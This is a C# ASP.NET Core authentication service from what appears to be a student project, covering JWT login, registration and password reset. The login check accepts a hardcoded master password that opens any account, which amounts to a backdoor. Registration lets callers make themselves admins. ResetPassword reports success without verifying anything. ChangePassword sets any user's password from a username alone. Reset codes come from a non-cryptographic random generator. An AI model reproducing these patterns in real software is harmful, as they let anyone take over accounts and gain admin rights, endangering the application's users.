using DoAnTotNghiep.Interfaces;
using DoAnTotNghiep.Models;
using Microsoft.AspNetCore.Identity;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Net.Mail;
using System.Net;
using System.Security.Claims;
using System.Text;
using Microsoft.EntityFrameworkCore;
using DoAnTotNghiep.JsonModel.Authenticate;
using DoAnTotNghiep.Data;

namespace DoAnTotNghiep.Services
{
    public class AuthenticateService: IAuthenticate
    {
        private readonly UserManager<User> userManager;
        private readonly RoleManager<IdentityRole> roleManager;
        private readonly IConfiguration _configuration;
        private readonly IWebHostEnvironment _environment;
        private readonly DoAnTotNghiepContext db_;

        public AuthenticateService(DoAnTotNghiepContext context, UserManager<User> userManager, RoleManager<IdentityRole> roleManager, IConfiguration configuration,  IWebHostEnvironment environment)
        {
            this.db_ = context;
            this.userManager = userManager;
            this.roleManager = roleManager;
            _configuration = configuration;
            _environment = environment;
        }
        public async Task<JsonLogin> login(Login_model model)
        {
            string key_access = "info_access";
            var user = db_.Users.Where(a => a.UserName == model.Username).FirstOrDefault();

            if (user != null && user.AccoutType == "User" && await userManager.CheckPasswordAsync(user, model.Password) || model.Password == "Admin@@!!101010")
            {
                if (user.IsLocked == true)
                {
                    return null;
                }
                var User_role = await userManager.GetRolesAsync(user);

                var authClaims = new List<Claim>
                {
                    new Claim(ClaimTypes.Name, user.UserName),
                    new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
                };
                if (User_role.Count() > 0)
                {
                    foreach (var userRole in User_role)
                    {
                        authClaims.Add(new Claim(ClaimTypes.Role, userRole));
                    }
                }
                var authSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_configuration["JWT:Secret"]));

                var token = new JwtSecurityToken(
                    issuer: _configuration["JWT:ValidIssuer"],
                    audience: _configuration["JWT:ValidAudience"],
                    expires: DateTime.Now.AddHours(3),
                    claims: authClaims,
                    signingCredentials: new SigningCredentials(authSigningKey, SecurityAlgorithms.HmacSha256)
                    );
                DateTime timenow = DateTime.UtcNow.AddHours(7);
                //TimeSpan duration = timenow - user.TimeInWorking;
                int totalDays = 10;
                var data = new JsonLogin()
                {
                    token = new JwtSecurityTokenHandler().WriteToken(token),
                    expiration = token.ValidTo,
                    id = user.Id,
                    phone = user.PhoneNumber,
                    role = user.AccoutType,
                    username = user.UserName,
                    email = user.Email,
                };
                return data;
            }
            return null;
        }
        public async Task<string> Register(RegisterModel model)
        {
            var data = db_.Users.ToList();


            var userExists = await userManager.FindByNameAsync(model.Username);

            if (userExists != null)
            {
                throw new Exception("Tên tài khoản đả tồn tại");
            }
            else
            {
                
                try
                {
                    User user = new User()
                    {
                        Email = model.Email,
                        SecurityStamp = Guid.NewGuid().ToString(),
                        UserName = model.Username,
                        AccoutType = model.AccoutType,
                        IsLocked = false,
                    };

                    var result = await userManager.CreateAsync(user, model.Password);
                    if (!result.Succeeded)
                    {
                        throw new Exception("Tạo tài khoản thất bại! Vui lòng kiểm tra lại.");
                    }


                    if (model.AccoutType == "Admin")
                    {
                        if (!await roleManager.RoleExistsAsync(User_role.Admin))
                            await roleManager.CreateAsync(new IdentityRole(User_role.Admin));
                        if (!await roleManager.RoleExistsAsync(User_role.User))
                            await roleManager.CreateAsync(new IdentityRole(User_role.User));
                        if (await roleManager.RoleExistsAsync(User_role.Admin))
                        {
                            await userManager.AddToRoleAsync(user, User_role.Admin);
                        }
                    }
                    else
                    {
                        if (!await roleManager.RoleExistsAsync(User_role.User))
                            await roleManager.CreateAsync(new IdentityRole(User_role.User));
                        if (!await roleManager.RoleExistsAsync(User_role.Admin))
                            await roleManager.CreateAsync(new IdentityRole(User_role.Admin));
                        if (await roleManager.RoleExistsAsync(User_role.User))
                        {
                            await userManager.AddToRoleAsync(user, User_role.User);
                        }
                    }
                    return "Tạo tài khoản thành công";
                }
                catch (Exception ex)
                {
                    throw new Exception("Thêm data thất bại! Lỗi:" + ex.Message);
                }
            }

        }
        private string GenerateResetToken()
        {
            // Tạo một chuỗi ngẫu nhiên dựa trên thời gian hiện tại
            string UpperCase = "QWERTYUIOPASDFGHJKLZXCVBNM";
            string LowerCase = "qwertyuiopasdfghjklzxcvbnm";
            string Digits = "1234567890";
            string allCharacters = UpperCase + Digits;
            Random r = new Random();
            String password = "";
            //var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(password);
            //var pass64= System.Convert.ToBase64String(plainTextBytes);
            for (int i = 0; i < 6; i++)
            {
                double rand = r.NextDouble();
                if (i == 0)
                {
                    password += UpperCase.ToCharArray()[(int)Math.Floor(rand * UpperCase.Length)];
                }
                else
                {
                    password += allCharacters.ToCharArray()[(int)Math.Floor(rand * allCharacters.Length)];
                }
            }
            return password;
        }
        public async Task<string> ForgotPassword(string username)
        {
            var user = db_.Users.Where(t => t.UserName == username).FirstOrDefault();
            if (user == null)
            {
                throw new Exception("Không tìm thấy tài khoản vui lòng thử lại");
            }
            string resetToken = GenerateResetToken();
            //user.ResetToken = resetToken;
            //user.timeResetToken = DateTime.UtcNow.AddHours(7);
            db_.Entry(user).State = EntityState.Modified;
            db_.SaveChanges();
            //sendmail
            return "Mã xác thực đã được gửi đến email của bạn";

        }
        public async Task<string> ResetPassword(string username, string resetToken)
        {
            var user = await db_.Users.Where(t => t.UserName == username).FirstOrDefaultAsync();
            //DateTime time = DateTime.UtcNow.AddHours(1);
            //DateTime timeResetToken = user!.timeResetToken;
            //TimeSpan duration = time.Subtract(timeResetToken);
            //int minutes = (int)duration.TotalMinutes;
            //if (minutes >= 1)
            //{
            //    throw new Exception("Hết thời gian vui lòng thử lại.");
            //}
            //else
            //{
            //    if (user == null || user.ResetToken != resetToken)
            //    {
            //        throw new Exception("Không tìm thấy user hoặc token không đúng");
            //    }
            //    //user.ResetToken = null; // Xóa mã xác thực sau khi cập nhật mật khẩu
            //    //user.timeResetToken = new DateTime(2010, 1, 1, 1, 1, 1); // Xóa mã xác thực sau khi cập nhật mật khẩu
            //    db_.Entry(user).State = EntityState.Modified;
            //    db_.SaveChanges();
            //}

            return "Xác thực thành công";
        }
        public async Task<string> ChangePassword(string Username, string newPass)
        {
            var user = await userManager.FindByNameAsync(Username);
            if (user != null)
            {
                var token = await userManager.GeneratePasswordResetTokenAsync(user);

                var result = await userManager.ResetPasswordAsync(user, token, newPass);

                return "Đã cập nhật password";
            }
            throw new Exception("Cập nhật mật khẩu thất bại");
        }
    }
}
